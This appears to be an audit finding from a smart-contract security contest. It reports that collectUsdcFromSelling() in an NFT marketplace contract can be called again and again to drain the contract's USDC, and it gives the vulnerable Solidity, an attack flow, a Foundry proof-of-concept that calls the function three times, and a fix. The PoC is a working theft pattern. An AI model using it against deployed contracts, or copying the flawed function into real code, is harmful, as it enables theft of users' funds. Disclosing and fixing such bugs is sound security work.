# WH-CH-NFT-001: `collectUsdcFromSelling()` Can Be Called Repeatedly to Drain All Contract USDC

**Platform**: Codehawks (First Flight #58)
**Program**: NFT Dealers
**Severity**: HIGH — Direct theft of funds
**Target**: `NFTDealers.sol:collectUsdcFromSelling()`

---

## Summary

`collectUsdcFromSelling()` has no re-call protection. After an NFT is sold, the seller can call this function repeatedly because neither the `collateralForMinting` mapping nor the listing itself is cleared after the first collection. Each call transfers `listing.price - fees + collateralForMinting` to the seller, draining the entire contract USDC balance.

## Vulnerability Details

**File**: `NFTDealers.sol:171-183`

```solidity
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
    require(!listing.isActive, "Listing must be inactive to collect USDC");

    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees;
    uint256 collateralToReturn = collateralForMinting[listing.tokenId];

    totalFeesCollected += fees;
    amountToSeller += collateralToReturn;
    usdc.safeTransfer(address(this), fees);  // BUG 1: self-transfer is a no-op
    usdc.safeTransfer(msg.sender, amountToSeller);
    // BUG 2: collateralForMinting[listing.tokenId] is NEVER zeroed
    // BUG 3: no flag to mark this listing as "collected"
}
```

**Three compounding bugs:**

1. `collateralForMinting[listing.tokenId]` is read but never set to 0 after transfer
2. No `collected` flag or state change prevents re-calling
3. `usdc.safeTransfer(address(this), fees)` transfers fees from contract to itself — a no-op that doesn't actually isolate fees

**Attack flow:**
1. Seller lists NFT, buyer buys it (listing becomes inactive)
2. Seller calls `collectUsdcFromSelling(listingId)` — receives `price - fees + collateral`
3. Seller calls it again — receives the same amount again (no state was cleared)
4. Repeat until contract is drained

## Impact

**Critical**: Any seller who has had an NFT sold can drain the entire USDC balance of the contract, stealing all other sellers' proceeds, collateral deposits, and accumulated fees.

## Proof of Concept

```solidity
function test_drainViaRepeatedCollect() public {
    // Setup: mint and list NFT, have buyer purchase it
    vm.prank(seller);
    nftDealers.list(tokenId, 100e6); // list for 100 USDC
    
    vm.prank(buyer);
    usdc.approve(address(nftDealers), 100e6);
    nftDealers.buy(tokenId);
    
    // Attack: seller calls collectUsdcFromSelling repeatedly
    uint256 balanceBefore = usdc.balanceOf(seller);
    
    vm.startPrank(seller);
    nftDealers.collectUsdcFromSelling(tokenId); // first call — legitimate
    nftDealers.collectUsdcFromSelling(tokenId); // second call — steals funds
    nftDealers.collectUsdcFromSelling(tokenId); // third call — more theft
    vm.stopPrank();
    
    // Seller received 3x the legitimate amount
    assertGt(usdc.balanceOf(seller) - balanceBefore, 100e6 * 2);
}
```

## Recommended Fix

```solidity
function collectUsdcFromSelling(uint256 _listingId) external onlySeller(_listingId) {
    Listing memory listing = s_listings[_listingId];
    require(!listing.isActive, "Listing must be inactive to collect USDC");
    
    uint256 collateralToReturn = collateralForMinting[listing.tokenId];
    require(listing.price > 0 || collateralToReturn > 0, "Already collected");
    
    uint256 fees = _calculateFees(listing.price);
    uint256 amountToSeller = listing.price - fees + collateralToReturn;
    
    // Clear state BEFORE transfer (CEI pattern)
    collateralForMinting[listing.tokenId] = 0;
    s_listings[_listingId].price = 0;  // prevent re-collection
    
    totalFeesCollected += fees;
    // Don't self-transfer fees — they stay in the contract
    usdc.safeTransfer(msg.sender, amountToSeller);
}
```
